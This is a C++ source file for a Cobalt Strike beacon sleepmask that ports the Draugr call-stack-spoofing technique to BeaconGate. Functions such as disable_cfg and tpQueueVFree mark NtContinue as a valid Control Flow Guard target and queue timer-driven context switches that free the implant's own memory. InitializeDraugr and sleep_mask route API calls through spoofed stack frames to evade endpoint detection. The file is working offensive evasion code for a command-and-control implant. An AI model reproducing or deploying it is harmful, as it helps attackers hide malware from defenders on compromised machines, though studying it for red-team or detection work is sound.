#include <windows.h>

#include "base/helpers.h"
#include "sleepmask.h"

/**
 * For the debug build we want:
 *   a) Include the mock-up layer
 *   b) Undefine DECLSPEC_IMPORT since the mocked Beacon API
 *      is linked against the the debug build.
 */
#ifdef _DEBUG
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#include "base\mock.h"
#endif

extern "C" {
#include "beacon.h"
#include "beacon_gate.h"

#include "sleepmask-vs.h"
#include "library/debug.cpp"
#include "library/utils.cpp"
#include "library/stdlib.cpp"
#include "library/masking.cpp"
#include "library/gate.cpp"

/**
* This is a port to BeaconGate of: https://github.com/NtDallas/Draugr.
* Only very minor changes to the original implementation have been made.
*/

// Draugr is only supported on X64.
#ifdef _WIN64
// Additional includes for draugr.
#include "library/stackspoofing.cpp"

//WINBASEAPI VOID WINAPI KERNEL32$OutputDebugStringA(LPCSTR lpOutputString);
//WINBASEAPI int       __cdecl MSVCRT$vsprintf_s(char* _DstBuf, size_t _DstSize, const char* _Format, ...);
//#define OutputDebugStringA        KERNEL32$OutputDebugStringA
//#define vsprintf_s                MSVCRT$vsprintf_s
//void dlog(const char* fmt, ...) {
//    char buff[512];
//    va_list va;
//    va_start(va, fmt);
//    vsprintf_s(buff, 512, fmt, va);
//    va_end(va);
//    OutputDebugStringA(buff);
//}

typedef enum _VIRTUAL_MEMORY_INFORMATION_CLASS
{
    VmPrefetchInformation,                      // s: MEMORY_PREFETCH_INFORMATION
    VmPagePriorityInformation,                  // s: MEMORY_PAGE_PRIORITY_INFORMATION
    VmCfgCallTargetInformation,                 // s: CFG_CALL_TARGET_LIST_INFORMATION // REDSTONE2
    VmPageDirtyStateInformation,                // s: MEMORY_PAGE_DIRTY_STATE_INFORMATION // REDSTONE3
    VmImageHotPatchInformation,                 // s: 19H1
    VmPhysicalContiguityInformation,            // s: MEMORY_PHYSICAL_CONTIGUITY_INFORMATION // 20H1 // (requires SeLockMemoryPrivilege)
    VmVirtualMachinePrepopulateInformation,
    VmRemoveFromWorkingSetInformation,          // s: MEMORY_REMOVE_WORKING_SET_INFORMATION
    MaxVmInfoClass
} VIRTUAL_MEMORY_INFORMATION_CLASS;
typedef struct _MEMORY_RANGE_ENTRY
{
    PVOID VirtualAddress;
    SIZE_T NumberOfBytes;
} MEMORY_RANGE_ENTRY, *PMEMORY_RANGE_ENTRY;
typedef struct {
    DWORD                 dwNumberOfOffsets;
    PULONG                plOutput;
    PCFG_CALL_TARGET_INFO ptOffsets;
    PVOID                 pMustBeZero;
    PVOID                 pMoarZero;
} VM_INFORMATION;
DFR(KERNEL32, CreateTimerQueue);
DFR(KERNEL32, RtlCaptureContext);
DFR(KERNEL32, CreateTimerQueueTimer);
DFR(KERNEL32, GetLastError);
DFR(KERNEL32, Sleep);
DFR(KERNEL32, VirtualFree);
DFR(KERNEL32, HeapAlloc);
DFR(KERNEL32, HeapFree);
DFR(KERNEL32, GetProcessHeap);
DFR(UCRTBASE, memcpy);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$GetProcessMitigationPolicy(HANDLE hProcess, PROCESS_MITIGATION_POLICY MitigationPolicy, PVOID lpBuffer, SIZE_T dwLength);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtContinue(PCONTEXT ThreadContext, BOOL RaiseAlert);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtQueryVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, int MemoryInformationClass, PVOID MemoryInformation, SIZE_T MemoryInformationLength, PSIZE_T ReturnLength);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtSetInformationVirtualMemory(HANDLE ProcessHandle, VIRTUAL_MEMORY_INFORMATION_CLASS VmInformationClass, SIZE_T NumberOfEntries, PMEMORY_RANGE_ENTRY VirtualAddresses, PVOID VmInformation, ULONG VmInformationLength);

BOOL cfg_enabled() {

    PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY cfg_policy = { 0 };

    if (!KERNEL32$GetProcessMitigationPolicy((HANDLE)-1, ProcessControlFlowGuardPolicy, &cfg_policy, sizeof(PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY))) {
        DLOGF("[!] GetProcessMitigationPolicy failed : %d", KERNEL32$GetLastError());
        return false;
    }

    DLOGF("[+] CFG Status : %d\n", cfg_policy.EnableControlFlowGuard);
    return cfg_policy.EnableControlFlowGuard;
}

// https://github.com/rasta-mouse/Crystal-Kit/blob/main/loader/src/cfg.c#L23
// https://github.com/Cracked5pider/CodeCave/blob/main/Cfg.c
bool disable_cfg(PVOID address) {
    MEMORY_BASIC_INFORMATION mbi = { 0 };
    VM_INFORMATION           vmi = { 0 };
    MEMORY_RANGE_ENTRY       mre = { 0 };
    CFG_CALL_TARGET_INFO     cti = { 0 };

    NTSTATUS status = NTDLL$NtQueryVirtualMemory ((HANDLE)-1, address, 0, &mbi, sizeof(mbi), 0 );

    if (status != 0) return FALSE;

    if (mbi.State != MEM_COMMIT || mbi.Type != MEM_IMAGE) return FALSE;

    cti.Offset = (ULONG_PTR)address - (ULONG_PTR)mbi.BaseAddress;
    cti.Flags  = CFG_CALL_TARGET_VALID;

    mre.NumberOfBytes  = (SIZE_T)mbi.RegionSize;
    mre.VirtualAddress = (PVOID)mbi.BaseAddress;

    ULONG output = 0;

    vmi.dwNumberOfOffsets = 0x1;
    vmi.plOutput          = &output;
    vmi.ptOffsets         = &cti;
    vmi.pMustBeZero       = 0x0;
    vmi.pMoarZero         = 0x0;

    status = NTDLL$NtSetInformationVirtualMemory((HANDLE)-1, VmCfgCallTargetInformation, 1, &mre, (PVOID)&vmi, (ULONG)sizeof(vmi));

    if ( status == 0xC00000F4 ) {
        /* the size parameter is not valid. try 24 instead, which is a known size for older windows versions */
        status = NTDLL$NtSetInformationVirtualMemory((HANDLE)-1, VmCfgCallTargetInformation, 1, &mre, (PVOID) &vmi, 24);
    }

    if (status != 0) {
        /* STATUS_INVALID_PAGE_PROTECTION - CFG wasn't enabled */ 
        if ( status == 0xC0000045 ) {
            /* pretend we bypassed it so timers can continue */
            return TRUE;
        }

        return FALSE;
    }

    return TRUE;
}

//https://github.com/rasta-mouse/Crystal-Kit/blob/main/loader/src/cleanup.c
//https://github.com/Cracked5pider/CodeCave/blob/main/EkkoEx/EkkoEx.c
bool tpQueueVFree(void* base_addr) {
    DLOGF("[+] NtContinue : 0x%p", NTDLL$NtContinue);
    if (cfg_enabled() == 1) disable_cfg((PVOID)NTDLL$NtContinue);

    HANDLE process_heap = KERNEL32$GetProcessHeap();
    if (process_heap == NULL) return false;

    PCONTEXT contexts = (PCONTEXT)KERNEL32$HeapAlloc(process_heap, HEAP_ZERO_MEMORY, sizeof(CONTEXT) * 2);
    CONTEXT context_template = { 0 };
    context_template.ContextFlags = CONTEXT_FULL;
   
    HANDLE timer_queue = KERNEL32$CreateTimerQueue();
    HANDLE timer = NULL;
    if (timer_queue == NULL) {
        DLOGF("[!] CreateTimerQueue : %d", KERNEL32$GetLastError());
        return false;
    }

    if (!KERNEL32$CreateTimerQueueTimer(&timer, timer_queue, (WAITORTIMERCALLBACK)KERNEL32$RtlCaptureContext, &context_template, 0, 0, WT_EXECUTEINTIMERTHREAD)) {
        DLOGF("[!] CreateTimerQueueTimer : %d", KERNEL32$GetLastError());
        return false;
    }
    KERNEL32$Sleep(500);
    DLOGF("[+] PRE_CTX %llx : %llx : %llx", context_template.Rip, context_template.Rcx, context_template.Rsp);
    if (context_template.Rip == 0 || context_template.Rsp == 0) {
        return false;
    }

    for (int i = 0; i < 2; i++) {
        UCRTBASE$memcpy(&contexts[i], &context_template, sizeof(CONTEXT));
        contexts[i].Rsp -= sizeof(PVOID);
    }

    contexts[0].Rip = (DWORD64)KERNEL32$VirtualFree;
    contexts[0].Rcx = (DWORD64)base_addr;
    contexts[0].Rdx = (DWORD64)0;
    contexts[0].R8 =  (DWORD64)MEM_RELEASE;

    contexts[1].Rip = (DWORD64)KERNEL32$HeapFree;
    contexts[1].Rcx = (DWORD64)process_heap;
    contexts[1].Rdx = (DWORD64)0;
    contexts[1].R8 =  (DWORD64)contexts;

    if (!KERNEL32$CreateTimerQueueTimer(&timer, timer_queue, (WAITORTIMERCALLBACK)NTDLL$NtContinue, &contexts[0], 500, 0, WT_EXECUTEINTIMERTHREAD)) {
        DLOGF("[!] CreateTimerQueueTimer 2 : %d", KERNEL32$GetLastError());
        return false;
    }
    // We dont want contexts to be freed before it's used by NtContinue
    if (!KERNEL32$CreateTimerQueueTimer(&timer, timer_queue, (WAITORTIMERCALLBACK)NTDLL$NtContinue, &contexts[1], 800, 0, WT_EXECUTEINTIMERTHREAD)) {
        DLOGF("[!] CreateTimerQueueTimer 3 : %d", KERNEL32$GetLastError());
        return false;
    }

    return true;
}

//TODO: Could probably make this more concise 
//TODO: This does not support drip loading
//TODO: This also doesnt cleanup heap records
void cleanupExitThread(PBEACON_INFO info) {
    DFR_LOCAL(KERNEL32, VirtualFree);
    #define VirtualFree KERNEL32$VirtualFree
    DFR_LOCAL(KERNEL32, ExitThread);
    PVOID pExitThread = (PVOID)KERNEL32$ExitThread;
    PVOID pVirtualFree = (PVOID)KERNEL32$VirtualFree;

    ALLOCATED_MEMORY_REGION sleepmaskRegion = { .Purpose = PURPOSE_EMPTY };

    for (int i = 0; i < 6; i++) {
        /*
            ALLOCATED_MEMORY_PURPOSE Purpose;      // A label to indicate the purpose of the allocated memory
            PVOID  AllocationBase;                 // The base address of the allocated memory block
            SIZE_T RegionSize;                     // The size of the allocated memory block
            DWORD Type;                            // The type of memory allocated
            DWORD DripLoadAllocationGranularity;   // The allocation granularity used when reserving memory for drip-loading
            ALLOCATED_MEMORY_SECTION Sections[8];  // An array of section information structures
            ALLOCATED_MEMORY_CLEANUP_INFORMATION CleanupInformation; // Information required to cleanup the allocation
        */
        ALLOCATED_MEMORY_REGION region = info->allocatedMemory.AllocatedMemoryRegions[i];
        ALLOCATED_MEMORY_PURPOSE purpose = region.Purpose;

        if (purpose != PURPOSE_EMPTY) {
            PVOID base = region.AllocationBase;
            SIZE_T regionSize = region.RegionSize;
            DWORD type = region.Type;
            ALLOCATED_MEMORY_ALLOCATION_METHOD method = region.CleanupInformation.AllocationMethod;
            BOOL cleanup = region.CleanupInformation.Cleanup;
            DLOGF("[SLEEPMASK:CLEANUP] purpose : %d\nbase : 0x%p\nsize : %llu\ntype : %lu\nmethod : %d\ncleanup : %d\n=====================", purpose, base, regionSize, type, method, cleanup);
            
            if (purpose == PURPOSE_SLEEPMASK_MEMORY) {
                DLOGF("found sleepmask memory region");
                sleepmaskRegion = region;
                continue;
            }

            if (method == METHOD_VIRTUALALLOC) {
                DLOGF("0x%p (0x%p, %d, MEM_DECOMMIT)", VirtualFree, base, regionSize);
                if (VirtualFree(base, regionSize, MEM_DECOMMIT) == 0)
                    DLOGF("[SLEEPMASK:CLEANUP] VirtualFree failed");
                if (VirtualFree(base, 0, MEM_RELEASE) == 0)
                    DLOGF("[SLEEPMASK:CLEANUP] VirtualFree failed 2");
                DLOGF("Successfully freed 0x%p", base);
            } else {
                DLOGF("[%d] Empty region", i);
            }
        }
    }


    PVOID pSleepMaskAllocation = NULL;
    if (sleepmaskRegion.Purpose == PURPOSE_SLEEPMASK_MEMORY && sleepmaskRegion.CleanupInformation.AllocationMethod == METHOD_VIRTUALALLOC) {
        pSleepMaskAllocation = sleepmaskRegion.AllocationBase;
        DLOGF("[SLEEPMASK:CLEANUP] Sleepmask found 0x%p", pSleepMaskAllocation);
    } else {
        pSleepMaskAllocation = info->sleep_mask_ptr;
        DLOGF("Sleepmask region not found, freeing from BEACON_INFO 0x%p", pSleepMaskAllocation);
    }
    //DLOGF("[ASM VAL]\n%p\n%p\n%p", pVirtualFree, pExitThread, pSleepMaskAllocation);
    tpQueueVFree(pSleepMaskAllocation);
    KERNEL32$ExitThread(0);
//    __asm__ (
//        "mov %[pVirtualFree], %%r11\n"
//        "push %[pExitThread]\n"
//        "mov %[pSleepMaskAllocation], %%rcx\n"
//        "mov $0, %%rdx\n"
//        "mov $0x8000, %%r8\n"
//        "jmp *%%r11"
//        : 
//        : [pExitThread] "r" (pExitThread), [pVirtualFree] "r" (pVirtualFree), [pSleepMaskAllocation] "r" (pSleepMaskAllocation)
//    );
}

    /**
    * Configures Draugr for use in BeaconGate.
    *
    * @param A pointer* to a DRAUGR_FUNCTION_CALL structure.
    */
    void InitializeDraugr(PDRAUGR_FUNCTION_CALL pDraugrCall) {
        // [0] Prepare spoofed stack frame struct.
        static SYNTHETIC_STACK_FRAME stackFrame;
        _memset(&stackFrame, 0, sizeof(stackFrame));

        // [1] Attempt to resolve spoofed call stack frame.
        if (!InitFrameInfo(&stackFrame)) {
            goto Cleanup;
        }

        // [2] Set target stack frame and call gate entry point.
        pDraugrCall->StackFrame = &stackFrame;
        pDraugrCall->SpoofCall = (PVOID)SpoofCall;
        DLOGF("SLEEPMASK: Successfully configured Draugr\n");

    Cleanup:
        return;
    }

    /**
    * Sleepmask-VS entry point
    *
    * Note: To enable logging for Release builds set ENABLE_LOGGING to
    * 1 in debug.h.
    */
    void sleep_mask(PBEACON_INFO info, PFUNCTION_CALL functionCall) {
        static BOOL draugrInitialized = FALSE;
        static DRAUGR_FUNCTION_CALL draugrCall;

        // [0] If logging is enabled, print relevant debug output.
#if ENABLE_LOGGING
        if (!draugrInitialized) PrintSleepMaskInfo(info);
#endif

        // [1] Initialize Draugr.
        if (!draugrInitialized) {
            InitializeDraugr(&draugrCall);
            draugrInitialized = TRUE;
        }

        if (functionCall->function == EXITTHREAD)
            cleanupExitThread(info);

        // Attach the passed function call to our Draugr struct.
        draugrCall.FunctionCall = functionCall;
        DraugrGateWrapper(info, &draugrCall);
        // Null it out on exit for next time.
        draugrCall.FunctionCall = NULL;

        return;
    }
}
#else
    // This is more verbose but avoids intellisense errors.
    void sleep_mask(PBEACON_INFO info, PFUNCTION_CALL functionCall) {
        DLOGF("SLEEPMASK: Calling %s via BeaconGate\n", winApiArray[functionCall->function]);
        BeaconGateWrapper(info, functionCall);

        return;
    }
}
#endif

// Define a main function for the debug build
#if defined(_DEBUG)
#include "unit-tests\syscallapi-unit-tests.cpp"
int main(int argc, char* argv[]) {
    /**
    * [0] Run a quick test BeaconGate example.
    * Note: The GateArg() Macro ensures variadic arguments are the correct size for the architecture.
    */
    FUNCTION_CALL functionCall = bof::mock::createFunctionCallStructure(
        (PVOID)VirtualAlloc, // Function Pointer
        WinApi::VIRTUALALLOC, // Human Readable WinApi Enum
        TRUE, // Mask Beacon
        4, // Number of Arguments
        GateArg(NULL),  // VirtualAlloc Arg1
        GateArg(0x1000), // VirtualAlloc Arg2
        GateArg(MEM_RESERVE | MEM_COMMIT), // VirtualAlloc Arg3
        GateArg(PAGE_EXECUTE_READWRITE) // VirtualAlloc Arg4
    );

    bof::runMockedBeaconGate(sleep_mask, &functionCall,
        {
            .allocator = bof::profile::Allocator::VirtualAlloc,
            .obfuscate = bof::profile::Obfuscate::False,
            .useRWX = bof::profile::UseRWX::False,
            .module = "",
        });

    VirtualFree((LPVOID)functionCall.retValue, 0, MEM_RELEASE);

    // [1] Check if asm harness is passing args correctly.
    BeaconPrintf(CALLBACK_OUTPUT, "BEACONGATE: Testing args are passed correctly");
    TestArgumentsArePassedCorrectlyWrapper();

    // [2] Now test coverage for *all* supported sys calls.
    BeaconPrintf(CALLBACK_OUTPUT, "BEACONGATE: Testing all supported sys calls");
    TestSysCallApi();

    return 0;
}

#endif

